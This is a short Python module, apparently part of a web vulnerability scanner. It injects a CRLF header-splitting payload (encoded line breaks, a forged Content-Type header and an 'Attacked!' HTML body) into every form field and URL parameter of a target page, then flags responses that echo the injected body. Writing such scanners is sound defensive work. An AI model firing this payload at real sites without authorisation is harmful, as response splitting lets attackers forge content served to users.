from ..log import vulnerability, warn
from ..utils import change_parameter, modify_parameter

INJECTED_BODY = "<html><h1>Attacked!</h1></html>"
CLRF_SEQUENCE = "%0d%0aContent-Type: text/html%0d%0a%0d%0a"
ATTACK_SEQUENCE = CLRF_SEQUENCE + INJECTED_BODY


def try_on_form(client, form):
    parameters = dict(form.get_parameters())
    for parameter in parameters:
        attack_parameters = modify_parameter(parameters, parameter,
                                             ATTACK_SEQUENCE)
        result = form.send(client, attack_parameters)
        evaluate(form.action, result)


def try_on_url(client, url, parameter):
    attack_parameters = change_parameter(url, parameter, ATTACK_SEQUENCE)
    result = client.download_page(attack_parameters)
    evaluate(url, result)


def evaluate(target, result):
    if result.html == INJECTED_BODY:
        vulnerability(target, "CLRF Injection", "under " + target)
    elif result.status_code == 500:
        warn(target, "Parameter Parsing Error", "under " + target)


def clrf(target_page, client):
    for form in target_page.get_forms():
        try_on_form(client, form)

    for parameter, _ in target_page.get_url_parameters:
        try_on_url(client, target_page.url, parameter)
